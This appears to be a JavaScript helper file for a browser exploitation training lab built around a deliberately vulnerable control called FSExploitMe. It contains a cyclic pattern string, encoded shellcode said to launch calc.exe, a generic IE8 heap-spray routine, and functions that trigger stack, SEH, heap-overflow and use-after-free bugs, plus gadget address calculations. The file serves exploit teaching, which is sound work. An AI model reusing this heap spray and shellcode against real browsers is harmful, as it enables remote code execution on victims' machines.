/*
	Utils.js
		Various utilities to be called upon to complete the Lessons
		
		Although this is pretty standard stuff, i do need to credit
		Dan Guido and the Trail of Bits guys, since i didnt take the time to
		run the commands to generate the pattern string and shellcode myself
		
		TODO: Run the commands :)
*/
var msfPatternString = "\u6141\u4130\u3161\u6141\u4132\u3361\u6141\u4134\u3561\u6141\u4136\u3761\u6141\u4138\u3961\u6241\u4130\u3162\u6241\u4132\u3362\u6241\u4134\u3562\u6241\u4136\u3762\u6241\u4138\u3962\u6341\u4130\u3163\u6341\u4132\u3363\u6341\u4134\u3563\u6341\u4136\u3763\u6341\u4138\u3963\u6441\u4130\u3164\u6441\u4132\u3364\u6441\u4134\u3564\u6441\u4136\u3764\u6441\u4138\u3964\u6541\u4130\u3165\u6541\u4132\u3365\u6541\u4134\u3565\u6541\u4136\u3765\u6541\u4138\u3965\u6641\u4130\u3166\u6641\u4132\u3366\u6641\u4134\u3566\u6641\u4136\u3766\u6641\u4138\u3966\u6741\u4130\u3167\u6741\u4132\u3367\u6741\u4134\u3567\u6741\u4136\u3767\u6741\u4138\u3967\u6841\u4130\u3168\u6841\u4132\u3368\u6841\u4134\u3568\u6841\u4136\u3768\u6841\u4138\u3968\u6941\u4130\u3169\u6941\u4132\u3369\u6941\u4134\u3569\u6941\u4136\u3769\u6941\u4138\u3969\u6a41\u4130\u316a\u6a41\u4132\u336a\u6a41\u4134\u356a\u6a41\u4136\u376a\u6a41\u4138\u396a\u6b41\u4130\u316b\u6b41\u4132\u336b\u6b41\u4134\u356b\u6b41\u4136\u376b\u6b41\u4138\u396b\u6c41\u4130\u316c\u6c41\u4132\u336c\u6c41\u4134\u356c\u6c41\u4136\u376c\u6c41\u4138\u396c\u6d41\u4130\u316d\u6d41\u4132\u336d\u6d41\u4134\u356d\u6d41\u4136\u376d\u6d41\u4138\u396d\u6e41\u4130\u316e\u6e41\u4132\u336e\u6e41\u4134\u356e\u6e41\u4136\u376e\u6e41\u4138\u396e\u6f41\u4130\u316f\u6f41\u4132\u336f\u6f41\u4134\u356f\u6f41\u4136\u376f\u6f41\u4138\u396f\u7041\u4130\u3170\u7041\u4132\u3370\u7041\u4134\u3570\u7041\u4136\u3770\u7041\u4138\u3970\u7141\u4130\u3171\u7141\u4132\u3371\u7141\u4134\u3571\u7141\u4136\u3771\u7141\u4138\u3971\u7241\u4130\u3172\u7241\u4132\u3372\u7241\u4134\u3572\u7241\u4136\u3772\u7241\u4138\u3972\u7341\u4130\u3173\u7341\u4132\u3373\u7341\u4134\u3573\u7341\u4136\u3773\u7341\u4138\u3973\u7441\u4130\u3174\u7441\u4132\u3374\u7441\u4134\u3574\u7441\u4136\u3774\u7441\u4138\u3974\u7541\u4130\u3175\u7541\u4132\u3375\u7541\u4134\u3575\u7541\u4136\u3775\u7541\u4138\u3975\u7641\u4130\u3176\u7641\u4132\u3376\u7641\u4134\u3576\u7641\u4136\u3776\u7641\u4138\u3976\u7741\u4130\u3177\u7741\u4132\u3377\u7741\u4134\u3577\u7741\u4136\u3777\u7741\u4138\u3977\u7841\u4130\u3178\u7841\u4132\u3378\u7841\u4134\u3578\u7841\u4136\u3778\u7841\u4138\u3978\u7941\u4130\u3179\u7941\u4132\u3379\u7941\u4134\u3579\u7941\u4136\u3779\u7941\u4138\u3979\u7a41\u4130\u317a\u7a41\u4132\u337a\u7a41\u4134\u357a\u7a41\u4136\u377a\u7a41\u4138\u397a\u6142\u4230\u3161\u6142\u4232\u3361\u6142\u4234\u3561\u6142\u4236\u3761\u6142\u4238\u3961\u6242\u4230\u3162\u6242\u4232\u3362\u6242\u4234\u3562\u6242\u4236\u3762\u6242\u4238\u3962\u6342\u4230\u3163\u6342\u4232\u3363\u6342\u4234\u3563\u6342\u4236\u3763\u6342\u4238\u3963\u6442\u4230\u3164\u6442\u4232\u3364\u6442\u4234\u3564\u6442\u4236\u3764\u6442\u4238\u3964\u6542\u4230\u3165\u6542\u4232\u3365\u6542\u4234\u3565\u6542\u4236\u3765\u6542\u4238\u3965\u6642\u4230\u3166\u6642\u4232\u3366\u6642\u4234\u3566\u6642\u4236\u3766\u6642\u4238\u3966\u6742\u4230\u3167\u6742\u4232\u3367\u6742\u4234\u3567\u6742\u4236\u3767\u6742\u4238\u3967\u6842\u4230\u3168\u6842\u4232\u3368\u6842\u4234\u3568\u6842\u4236\u3768\u6842\u4238\u3968\u6942\u4230\u3169\u6942\u4232\u3369\u6942\u4234\u3569\u6942\u4236\u3769\u6942\u4238\u3969\u6a42\u4230\u316a\u6a42\u4232\u336a\u6a42\u4234\u356a\u6a42\u4236\u376a\u6a42\u4238\u396a\u6b42\u4230\u316b\u6b42\u4232\u336b\u6b42\u4234\u356b\u6b42\u4236\u376b\u6b42\u4238\u396b\u6c42\u4230\u316c\u6c42\u4232\u336c\u6c42\u4234\u356c\u6c42\u4236\u376c\u6c42\u4238\u396c\u6d42\u4230\u316d\u6d42\u4232\u336d\u6d42\u4234\u356d\u6d42\u4236\u376d\u6d42\u4238\u396d\u6e42\u4230\u316e\u6e42\u4232\u336e\u6e42\u4234\u356e\u6e42\u4236\u376e\u6e42\u4238\u396e\u6f42\u4230\u316f\u6f42\u4232\u336f\u6f42\u4234\u356f\u6f42\u4236\u376f\u6f42\u4238\u396f\u7042\u4230\u3170\u7042\u4232\u3370\u7042\u4234\u3570\u7042\u4236\u3770\u7042\u4238\u3970\u7142\u4230\u3171\u7142\u4232\u3371\u7142\u4234\u3571\u7142\u4236\u3771\u7142\u4238\u3971\u7242\u4230\u3172\u7242\u4232\u3372\u7242\u4234\u3572\u7242\u4236\u3772\u7242\u4238\u3972\u7342\u4230\u3173\u7342\u4232\u3373\u7342\u4234\u3573\u7342\u4236\u3773\u7342\u4238\u3973\u7442\u4230\u3174\u7442\u4232\u3374\u7442\u4234\u3574\u7442\u4236\u3774\u7442\u4238\u3974\u7542\u4230\u3175\u7542\u4232\u3375\u7542\u4234\u3575\u7542\u4236\u3775\u7542\u4238\u3975\u7642\u4230\u3176\u7642\u4232\u3376\u7642\u4234\u3576\u7642\u4236\u3776\u7642\u4238\u3976\u7742\u4230\u3177\u7742\u4232\u3377\u7742\u4234\u3577\u7742\u4236\u3777\u7742\u4238\u3977\u7842\u4230\u3178\u7842\u4232\u3378\u7842\u4234\u3578\u7842\u4236\u3778\u7842\u4238\u3978\u7942\u4230\u3179\u7942\u4232\u3379\u7942\u4234\u3579\u7942\u4236\u3779\u7942\u4238\u3979\u7a42\u4230\u317a\u7a42\u4232\u337a\u7a42\u4234\u357a\u7a42\u4236\u377a\u7a42\u4238\u397a\u6143\u4330\u3161\u6143\u4332\u3361\u6143\u4334\u3561\u6143\u4336\u3761\u6143\u4338\u3961\u6243\u4330\u3162\u6243\u4332\u3362\u6243\u4334\u3562\u6243\u4336\u3762\u6243\u4338\u3962\u6343\u4330\u3163\u6343\u4332\u3363\u6343\u4334\u3563\u6343\u4336\u3763\u6343\u4338\u3963\u6443\u4330\u3164\u6443\u4332\u3364\u6443\u4334\u3564\u6443\u4336\u3764\u6443\u4338\u3964\u6543\u4330\u3165\u6543\u4332\u3365\u6543\u4334\u3565\u6543\u4336\u3765\u6543\u4338\u3965\u6643\u4330\u3166\u6643\u4332\u3366\u6643\u4334\u3566\u6643\u4336\u3766\u6643\u4338\u3966\u6743\u4330\u3167\u6743\u4332\u3367\u6743\u4334\u3567\u6743\u4336\u3767\u6743\u4338\u3967\u6843\u4330\u3168\u6843\u4332\u3368\u6843\u4334\u3568\u6843\u4336\u3768\u6843\u4338\u3968\u6943\u4330\u3169\u6943\u4332\u3369\u6943\u4334\u3569\u6943\u4336\u3769\u6943\u4338\u3969\u6a43\u4330\u316a\u6a43\u4332\u336a\u6a43\u4334\u356a\u6a43\u4336\u376a\u6a43\u4338\u396a\u6b43\u4330\u316b\u6b43\u4332\u336b\u6b43\u4334\u356b\u6b43\u4336\u376b\u6b43\u4338\u396b\u6c43\u4330\u316c\u6c43\u4332\u336c\u6c43\u4334\u356c\u6c43\u4336\u376c\u6c43\u4338\u396c\u6d43\u4330\u316d\u6d43\u4332\u336d\u6d43\u4334\u356d\u6d43\u4336\u376d\u6d43\u4338\u396d\u6e43\u4330\u316e\u6e43\u4332\u336e\u6e43\u4334\u356e\u6e43\u4336\u376e\u6e43\u4338\u396e\u6f43\u4330\u316f\u6f43\u4332\u336f\u6f43\u4334\u356f\u6f43";

/*
 * Shellcode that runs calc.exe
 */
var shellcode = unescape("%uec83%u9064%u98b8%u5528%uda45%ud9c9%u2474%u31f4%ub1c9%u5b33%u4331%u8313%ufceb%u4303%uca97%ub9a0%u834f%u424b%uf48f%ua7c2%u26be%uacb0%uf692%ue1b2%u7c1e%u1196%uf095%u153f%ube1e%u1819%u0e9f%uf6a6%u1063%u055a%uf2b7%uc663%uf3ca%u3ba4%ua124%u377d%u5696%u0509%u562a%u01dd%u2012%ud558%u9ae6%u0663%u9056%ube2c%ufedd%ubf8c%u1d32%uf6f0%ud63f%u0882%u26e9%u3b6a%ue5d5%uf355%uf4d8%u3492%u8302%u46e8%u94bf%u342a%u101b%u9eaf%u82e8%u1e0b%u543d%u2cdf%u128a%u3087%uf60d%u4db3%uf986%uc413%udddc%u8cb7%u7c87%u68e1%u8066%ud5f1%u24d7%uf779%u5e0c%u9220%ud2d3%udb5e%uecd3%u4c60%uddbb%u03eb%ue1bc%u6039%ua832%uc160%u75da%u53f1%u8587%u972f%u05b1%u68da%u1546%u6daf%u9103%u1c43%u741c%ub364%u5d1d%u5207%u3d8d%uf1e6%ua735%uf3f6");


function MakeString(length)
{
	var str = "";
	do {
		str += "\u4141";
	} while (str.length < length);

	return str;
}

// Generic IE8 HeapSpray
function L3HeapSpray(data) {

	// Basis for all other strings
	var str = "\u4141";
	
    while (str.length < 100000)
        str = str + str;
	
	// Build a 64kb string
	var str64k = data + str.substr(0, (64*1024/2) - data.length);

	// Make 16 copies for a 1mb string
	str1mb = "";
	
	for(i=0; i<15; i++) {
		str1mb += str64k;
	}
	
	str1mb += str64k.substr(0, (64*1024/2) - (38)); 
	
	// 100mb allocation
	sprayArray = new Array();
	for(i=0; i<100; i++) {
		sprayArray[i] = str1mb.substr(0, ((64*1024/2)*16) - (38));
	}
}



/*
	Everything here is to make modifying this easier.. Dont change anything if you don't
	know whats going on :)
*/
function printJsDword(dword) {
	arr = dword.match(/..../g);
	return "\\u" + arr[1] + "\\u" + arr[0]; // TODO: Sloppy
}
function GetLoadAddr(offset) {
	var LoadAddr = FSExploitMe.GetModuleLoadAddr();
	LoadAddr += offset;
	return LoadAddr.toString(16);
}
function GetWinDbgAddr() {
	var eip = FSExploitMe.GetWinDbgFuncAddr();
	return eip.toString(16);
}
function GetStackSize() {
	var size = FSExploitMe.GetStackSize();
	return size.toString(16);
}
function GetStackTimeFuncAddr() {
	var eip = FSExploitMe.GetStackTimeFuncAddr();
	return eip.toString(16);
}
function GetStackTimeSetupFuncAddr() {
	var eip = FSExploitMe.GetStackTimeSetupFuncAddr();
	return eip.toString(16);
}
function GetLaunchCalcFuncAddr() {
	var eip = FSExploitMe.GetLaunchCalcFuncAddr();
	return eip.toString(16);
}
function GetProcHeapAddr() {
	var eip = FSExploitMe.GetProcHeapAddr();
	return eip.toString(16);
}

function unhide(divID) {
	var LessonDivs = document.getElementById("divLessons").getElementsByTagName('div');
	for (var i=0; i<LessonDivs.length; i++) {
		if (LessonDivs[i].id.match("divLesson")) {
			LessonDivs[i].className='hidden';
			if ( LessonDivs[i] == document.getElementById(divID)){
				LessonDivs[i].className='unhidden';
			}
		}
	}
}
function toggle(elemId) {
	var myElem = document.getElementById(elemId); 
	if (myElem.className == "hidden") {
		myElem.className = "unhidden";
	} else {
		myElem.className = "hidden";
	}
}

function LearningTheStack() {
	FSExploitMe.LearningTheStack();
}
function Allocate() {
	myBlock = FSExploitMe.AllocateData(10);
}
function Write() {
	if (myBlock) {
		FSExploitMe.WriteData(myBlock, "ABCD");
	}
}
function Deallocate() {
	if (myBlock) {
		FSExploitMe.FreeData(myBlock);
		myBlock = null;
	}
}
function UseAfterFree() {
	myBlock = FSExploitMe.AllocateData(10);
	FSExploitMe.FreeData(myBlock);
	FSExploitMe.WriteData(myBlock, "ABCD");
}
function WinDbg() {
	FSExploitMe.WinDbgHoops();
}
function StackTimeSetup() {
	FSExploitMe.StackTimeSetup();
}
function StackSMASH(len) {
	FSExploitMe.StackBuffer(MakeString(len));
}
function StackException(len) {
	FSExploitMe.StackException(MakeString(len));
}
function HeapOverflow() {
	FSExploitMe.HeapOverflow(MakeString(40),MakeString(10));
}

var WinDbgPath 				= "c:\\Program Files (x86)\\Debugging Tools for Windows\\"
//var WinDbgPath 					= "c:\\Program Files (x86)\\Windows Kits\\8.0\\Debuggers\\x86\\"; 
var WinDbgFuncAddr 				= GetWinDbgAddr();
var ModLoadAddr					= GetLoadAddr(0);
var ModEndAddr 					= GetLoadAddr(0xb000);
var JmpEspAddr 					= GetLoadAddr(0x2437); // 54432467  // 54432437   
var StackRet4					= GetLoadAddr(0x2159); // 54432159 This is daBossFuncAddr + 0x48
var ProcHeapAddr				= GetProcHeapAddr();
var StackTimeFuncAddr			= GetStackTimeFuncAddr();
var StackTimeSetupFuncAddr 		= GetStackTimeSetupFuncAddr();
var StackSize					= GetStackSize();
var StackBufferFuncAddr 		= GetLoadAddr(0x20c0);// "544320c0";
var daBossFuncAddr				= GetLoadAddr(0x20e0); // 54432110 //544320e0 
var StackTimeMyFuncAddr			= GetLoadAddr(0x1f30); 
var FreeDataHeapFreeAddr		= GetLoadAddr(0x208a);// "5443202f"; 5443208a 
var StackExceptionScreamerAddr 	= GetLoadAddr(0x2100);// "54432100";
var L3CallToHeapFree			= GetLoadAddr(0x24d0); // 
var StackTimeHeapAddr			= GetLoadAddr(0x1ef0);
